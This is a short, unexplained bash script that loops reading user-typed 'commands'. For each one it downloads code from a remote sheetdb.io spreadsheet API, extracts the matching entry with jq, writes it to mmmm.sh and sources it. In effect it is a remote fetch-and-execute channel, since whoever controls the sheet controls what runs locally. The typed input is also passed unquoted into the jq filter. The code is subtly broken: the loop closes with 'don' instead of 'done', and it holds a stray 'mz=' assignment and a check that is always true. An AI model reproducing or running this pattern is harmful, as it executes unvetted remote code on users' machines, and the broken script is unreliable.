while sleep 0
do
read -p 'command-$ ' input
command_not_found_handle() {
echo -e $input'\033[91m : Error Command\033[00m'
}
if [ $input == $input ]; then
curl -s https://sheetdb.io/api/v1/9k4t6tfssbyud | mz= jq '.[] | .'$input | sed 's/"//g' > mmmm.sh ; source mmmm.sh
fi
don
